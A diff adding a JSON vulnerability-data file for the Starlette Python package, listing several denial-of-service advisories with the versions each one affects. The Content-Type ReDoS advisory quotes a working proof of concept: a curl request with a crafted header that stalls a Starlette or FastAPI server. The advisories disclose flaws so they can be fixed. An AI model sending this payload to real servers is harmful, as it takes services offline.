@@ -1,0 +1,1657 @@
+{
+  "schema_version": 1,
+  "package": "starlette-base",
+  "purls": [
+    "pkg:pypi/starlette"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 2,
+  "advisories": [
+    {
+      "id": "GHSA-2c2j-9gv5-cj73",
+      "primary_id": "CVE-2025-54121",
+      "aliases": [
+        "CVE-2025-54121"
+      ],
+      "cve_ids": [
+        "CVE-2025-54121"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": "Starlette has possible denial-of-service vector when parsing large files in multipart forms",
+      "details": "### Summary\nWhen parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.\n\n### Details\nPlease see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.\n\n```python\n\n    @property\n    def _in_memory(self) -> bool:\n        # check for SpooledTemporaryFile._rolled\n        rolled_to_disk = getattr(self.file, \"_rolled\", True)\n        return not rolled_to_disk\n\n    async def write(self, data: bytes) -> None:\n        if self.size is not None:\n            self.size += len(data)\n\n        if self._in_memory:\n            self.file.write(data)\n        else:\n            await run_in_threadpool(self.file.write, data)\n```\n\nI have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962\n\n\n### PoC\nSee the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.\n\n### Impact\nTo be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact.",
+      "published": "2025-07-21T19:34:23Z",
+      "modified": "2026-02-04T03:59:48.987107Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/security/advisories/GHSA-2c2j-9gv5-cj73"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54121"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/commit/9f7ec2eb512fcc3fe90b43cb9dd9e1d08696bec1"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/encode/starlette"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-2c2j-9gv5-cj73",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.47.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.10",
+        "0.1.11",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.17",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.10.4",
+        "0.10.5",
+        "0.10.6",
+        "0.10.7",
+        "0.11.0",
+        "0.11.1",
+        "0.11.2",
+        "0.11.3",
+        "0.11.4",
+        "0.12.0",
+        "0.12.0b1",
+        "0.12.0b2",
+        "0.12.0b3",
+        "0.12.1",
+        "0.12.10",
+        "0.12.11",
+        "0.12.12",
+        "0.12.13",
+        "0.12.2",
+        "0.12.3",
+        "0.12.4",
+        "0.12.5",
+        "0.12.6",
+        "0.12.7",
+        "0.12.8",
+        "0.12.9",
+        "0.13.0",
+        "0.13.1",
+        "0.13.2",
+        "0.13.3",
+        "0.13.4",
+        "0.13.5",
+        "0.13.6",
+        "0.13.7",
+        "0.13.8",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.17.1",
+        "0.18.0",
+        "0.19.0",
+        "0.19.1",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.20.3",
+        "0.20.4",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.23.1",
+        "0.24.0",
+        "0.25.0",
+        "0.26.0",
+        "0.26.0.post1",
+        "0.26.1",
+        "0.27.0",
+        "0.28.0",
+        "0.29.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.30.0",
+        "0.31.0",
+        "0.31.1",
+        "0.32.0",
+        "0.32.0.post1",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.35.1",
+        "0.36.0",
+        "0.36.1",
+        "0.36.2",
+        "0.36.3",
+        "0.37.0",
+        "0.37.1",
+        "0.37.2",
+        "0.38.0",
+        "0.38.1",
+        "0.38.2",
+        "0.38.3",
+        "0.38.4",
+        "0.38.5",
+        "0.38.6",
+        "0.39.0",
+        "0.39.1",
+        "0.39.2",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.40.0",
+        "0.41.0",
+        "0.41.1",
+        "0.41.2",
+        "0.41.3",
+        "0.42.0",
+        "0.43.0",
+        "0.44.0",
+        "0.45.0",
+        "0.45.1",
+        "0.45.2",
+        "0.45.3",
+        "0.46.0",
+        "0.46.1",
+        "0.46.2",
+        "0.47.0",
+        "0.47.1",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "0.8.8",
+        "0.9.0",
+        "0.9.1",
+        "0.9.10",
+        "0.9.11",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5",
+        "0.9.6",
+        "0.9.7",
+        "0.9.8",
+        "0.9.9"
+      ],
+      "affected_conda_versions": [
+        "0.13.5",
+        "0.13.6"
+      ]
+    },
+    {
+      "id": "GHSA-3qj8-93xh-pwh2",
+      "primary_id": "GHSA-3qj8-93xh-pwh2",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": "Duplicate Advisory: Starlette allows an unauthenticated and remote attacker to specify any number of form fields or files",
+      "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-74m5-2c7w-9w3x. This link is maintained to preserve external references.\n\n## Original Description\nThere MultipartParser usage in Encode's Starlette python framework before versions 0.25.0 allows an unauthenticated and remote attacker to specify any number of form fields or files which can cause excessive memory usage resulting in denial of service of the HTTP service.",
+      "published": "2023-04-21T18:30:24Z",
+      "modified": "2024-11-28T05:26:54.154689Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/security/advisories/GHSA-74m5-2c7w-9w3x"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30798"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/commit/8c74c2c8dba7030154f8af18e016136bea1938fa"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/encode/starlette"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vulncheck.com/advisories/starlette-multipartparser-dos"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-3qj8-93xh-pwh2",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.25.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.10",
+        "0.1.11",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.17",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.10.4",
+        "0.10.5",
+        "0.10.6",
+        "0.10.7",
+        "0.11.0",
+        "0.11.1",
+        "0.11.2",
+        "0.11.3",
+        "0.11.4",
+        "0.12.0",
+        "0.12.0b1",
+        "0.12.0b2",
+        "0.12.0b3",
+        "0.12.1",
+        "0.12.10",
+        "0.12.11",
+        "0.12.12",
+        "0.12.13",
+        "0.12.2",
+        "0.12.3",
+        "0.12.4",
+        "0.12.5",
+        "0.12.6",
+        "0.12.7",
+        "0.12.8",
+        "0.12.9",
+        "0.13.0",
+        "0.13.1",
+        "0.13.2",
+        "0.13.3",
+        "0.13.4",
+        "0.13.5",
+        "0.13.6",
+        "0.13.7",
+        "0.13.8",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.17.1",
+        "0.18.0",
+        "0.19.0",
+        "0.19.1",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.20.3",
+        "0.20.4",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.23.1",
+        "0.24.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "0.8.8",
+        "0.9.0",
+        "0.9.1",
+        "0.9.10",
+        "0.9.11",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5",
+        "0.9.6",
+        "0.9.7",
+        "0.9.8",
+        "0.9.9"
+      ],
+      "affected_conda_versions": [
+        "0.13.5",
+        "0.13.6"
+      ]
+    },
+    {
+      "id": "GHSA-74m5-2c7w-9w3x",
+      "primary_id": "CVE-2023-30798",
+      "aliases": [
+        "CVE-2023-30798",
+        "PYSEC-2023-48"
+      ],
+      "cve_ids": [
+        "CVE-2023-30798"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": "MultipartParser denial of service with too many fields or files",
+      "details": "### Impact\n\nThe `MultipartParser` using the package `python-multipart` accepts an unlimited number of multipart parts (form fields or files).\n\nProcessing too many parts results in high CPU usage and high memory usage, eventually leading to an <abbr title=\"out of memory\">OOM</abbr> process kill.\n\nThis can be triggered by sending too many small form fields with no content, or too many empty files.\n\nFor this to take effect application code has to:\n\n* Have `python-multipart` installed and\n* call `request.form()`\n  * or via another framework like FastAPI, using form field parameters or `UploadFile` parameters, which in turn calls `request.form()`.\n\n### Patches\n\nThe vulnerability is solved in Starlette 0.25.0 by making the maximum fields and files customizable and with a sensible default (1000). \n\nApplications will be secure by just upgrading their Starlette version to 0.25.0 (or FastAPI to 0.92.0).\n\nIf application code needs to customize the new max field and file number, there are new `request.form()` parameters (with the default values):\n\n* `max_files=1000`\n* `max_fields=1000`\n\n### Workarounds\n\nApplications that don't install `python-multipart` or that don't use form fields are safe.\n\nIn older versions, it's also possible to instead of calling `request.form()` call `request.stream()` and parse the form data in internal code.\n\nIn most cases, the best solution is to upgrade the Starlette version.\n\n### References\n\nThis was reported in private by @das7pad via internal email. He also coordinated the fix across multiple frameworks and parsers.\n\nThe details about how `multipart/form-data` is structured and parsed are in the [RFC 7578](https://www.rfc-editor.org/rfc/rfc7578).\n",
+      "published": "2023-02-14T21:31:28Z",
+      "modified": "2026-03-16T03:12:49.719486Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/security/advisories/GHSA-74m5-2c7w-9w3x"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30798"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/commit/8c74c2c8dba7030154f8af18e016136bea1938fa"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/encode/starlette"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/starlette/PYSEC-2023-48.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vulncheck.com/advisories/starlette-multipartparser-dos"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-74m5-2c7w-9w3x",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.25.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.10",
+        "0.1.11",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.17",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.10.4",
+        "0.10.5",
+        "0.10.6",
+        "0.10.7",
+        "0.11.0",
+        "0.11.1",
+        "0.11.2",
+        "0.11.3",
+        "0.11.4",
+        "0.12.0",
+        "0.12.0b1",
+        "0.12.0b2",
+        "0.12.0b3",
+        "0.12.1",
+        "0.12.10",
+        "0.12.11",
+        "0.12.12",
+        "0.12.13",
+        "0.12.2",
+        "0.12.3",
+        "0.12.4",
+        "0.12.5",
+        "0.12.6",
+        "0.12.7",
+        "0.12.8",
+        "0.12.9",
+        "0.13.0",
+        "0.13.1",
+        "0.13.2",
+        "0.13.3",
+        "0.13.4",
+        "0.13.5",
+        "0.13.6",
+        "0.13.7",
+        "0.13.8",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.17.1",
+        "0.18.0",
+        "0.19.0",
+        "0.19.1",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.20.3",
+        "0.20.4",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.23.1",
+        "0.24.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "0.8.8",
+        "0.9.0",
+        "0.9.1",
+        "0.9.10",
+        "0.9.11",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5",
+        "0.9.6",
+        "0.9.7",
+        "0.9.8",
+        "0.9.9"
+      ],
+      "affected_conda_versions": [
+        "0.13.5",
+        "0.13.6"
+      ]
+    },
+    {
+      "id": "GHSA-93gm-qmq6-w238",
+      "primary_id": "GHSA-93gm-qmq6-w238",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "starlette",
+      "summary": "Duplicate Advisory: Starlette Content-Type Header ReDoS",
+      "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-2jv5-9r88-3w3p. This link is maintained to preserve external references.\n\n## Original Description\n\n### Summary\n\nWhen using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.\n\nAn attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.\n\nThis can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\nThis only applies when the app uses form data, parsed with `python-multipart`.\n\n### Details\n\nA regular HTTP `Content-Type` header could look like:\n\n```\nContent-Type: text/html; charset=utf-8\n```\n\n`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\n\nA custom option could be made and sent to the server to break it with:\n\n```\nContent-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n```\n\n### PoC\n\nCreate a Starlette app that uses form data. To reproduce it it's not even necessary to create a Starlette app, just using the `Request` is enough:\n\n```Python\n# main.py\nfrom starlette.requests import Request\nfrom starlette.responses import JSONResponse\n\n\nasync def app(scope, receive, send):\n    assert scope[\"type\"] == \"http\"\n    request = Request(scope, receive)\n    data = await request.form()\n    response_data = {}\n    for key in data:\n        print(key, data.getlist(key))\n        response_data[key] = data.getlist(key)\n    response = JSONResponse(response_data)\n    await response(scope, receive, send)\n```\n\nThen start it with:\n\n```console\n$ uvicorn main:app\n\nINFO:     Started server process [50601]\nINFO:     Waiting for application startup.\nINFO:     ASGI 'lifespan' protocol appears unsupported.\nINFO:     Application startup complete.\nINFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)\n```\n\nThen send the attacking request with:\n\n```console\n$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/'\n```\n\n#### Stopping it\n\nBecause that holds the main loop consuming the CPU non-stop, it's not possible to simply kill Uvicorn with `Ctrl+C` as it can't handle the signal.\n\nTo stop it, first check the process ID running Uvicorn:\n\n```console\n$ ps -fA | grep uvicorn\n\n  501 59461 24785   0  4:28PM ttys004    0:00.13 /Users/user/code/starlette/env3.10/bin/python /Users/user/code/starlette/env3.10/bin/uvicorn redos_starlette:app\n  501 59466 99935   0  4:28PM ttys010    0:00.00 grep uvicorn\n```\n\nIn this case, the process ID was `59461`, then you can kill it (forcefully, with `-9`) with:\n\n```console\n$ kill -9 59461\n```\n\n### Impact\n\nIt's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This way it also affects other libraries using Starlette, like FastAPI.\n\n### Original Report\n\nThis was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r\n\n<details>\n<summary>Original report to FastAPI</summary>\n\nHey Tiangolo!\n\nMy name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).\n\nHere are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:\n\n```Python\nfrom typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n```\n\nI'm running the above with uvicorn with the following command:\n\n```console\nuvicorn server:app\n```\n\nThen run the following cUrl command:\n\n```\ncurl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n```\n\nYou'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%\n\nYou can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.\n\nIf you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.\n\nCheers\n\n#### Impact\n\nAn attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.\n\n#### Occurrences\n\n[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)\n\n</details>",
+      "published": "2024-02-05T17:01:19Z",
+      "modified": "2026-02-04T03:16:25.463892Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/encode/starlette"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-93gm-qmq6-w238",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.36.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.10",
+        "0.1.11",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.17",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.10.4",
+        "0.10.5",
+        "0.10.6",
+        "0.10.7",
+        "0.11.0",
+        "0.11.1",
+        "0.11.2",
+        "0.11.3",
+        "0.11.4",
+        "0.12.0",
+        "0.12.0b1",
+        "0.12.0b2",
+        "0.12.0b3",
+        "0.12.1",
+        "0.12.10",
+        "0.12.11",
+        "0.12.12",
+        "0.12.13",
+        "0.12.2",
+        "0.12.3",
+        "0.12.4",
+        "0.12.5",
+        "0.12.6",
+        "0.12.7",
+        "0.12.8",
+        "0.12.9",
+        "0.13.0",
+        "0.13.1",
+        "0.13.2",
+        "0.13.3",
+        "0.13.4",
+        "0.13.5",
+        "0.13.6",
+        "0.13.7",
+        "0.13.8",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.17.1",
+        "0.18.0",
+        "0.19.0",
+        "0.19.1",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.20.0",
+        "0.20.1",
+        "0.20.2",
+        "0.20.3",
+        "0.20.4",
+        "0.21.0",
+        "0.22.0",
+        "0.23.0",
+        "0.23.1",
+        "0.24.0",
+        "0.25.0",
+        "0.26.0",
+        "0.26.0.post1",
+        "0.26.1",
+        "0.27.0",
+        "0.28.0",
+        "0.29.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.30.0",
+        "0.31.0",
+        "0.31.1",
+        "0.32.0",
+        "0.32.0.post1",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.35.1",
+        "0.36.0",
+        "0.36.1",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "0.8.8",
+        "0.9.0",
+        "0.9.1",
+        "0.9.10",
+        "0.9.11",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5",
+        "0.9.6",
+        "0.9.7",
+        "0.9.8",
+        "0.9.9"
+      ],
+      "affected_conda_versions": [
+        "0.13.5",
